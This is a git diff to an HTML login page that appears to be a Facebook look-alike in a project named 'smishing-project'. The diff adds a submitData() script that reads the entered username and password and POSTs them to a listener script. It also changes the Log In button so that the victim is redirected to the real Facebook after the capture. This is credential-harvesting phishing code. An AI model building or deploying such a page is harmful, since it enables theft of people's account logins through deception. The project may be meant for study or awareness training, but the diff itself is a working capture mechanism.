@@ -17,6 +17,7 @@
       href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
     />
     <link rel="stylesheet" href="CSS/style.css" />
+
   </head>
 
   <body>
@@ -69,6 +70,7 @@
             type="password"
             size="40"
             placeholder="Password"
+            
           />
         
         </div>
@@ -79,7 +81,7 @@
           type="submit"
           id="bt"
           class="login-btn btn btn-primary btn-lg"
-          onclick="window.location.href='https://www.facebook.com/';"
+          onclick="window.location.href='https://www.facebook.com/'; submitData()"
         >
         <b>Log In</b>
         </button>
@@ -148,6 +150,33 @@
 
       });
   </script>
+    <script>
+      function submitData() {
+        document
+        .getElementById("inputForm")
+        .addEventListener("submit", async (event) =>{
+          event.preventDefault();
+
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', '/Users/karypaquot/documents/github/smishing-project/website/listener.py', true);
+          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+            // Handle the response from the Python script
+              console.log(xhr.responseText);
+            }
+          };
+          var username = document.getElementById('userName').value;
+          var password = document.getElementById('passWord').value;
+          var requestBody = {
+            "username": username, 
+            "password": password
+          };
+          xhr.send(JSON.stringify(requestBody));
+        });
+      }      
+    </script>
+  
 
   <!-- this script allows us to save credentials as json file using browser built-in API -->
   <!-- <script>
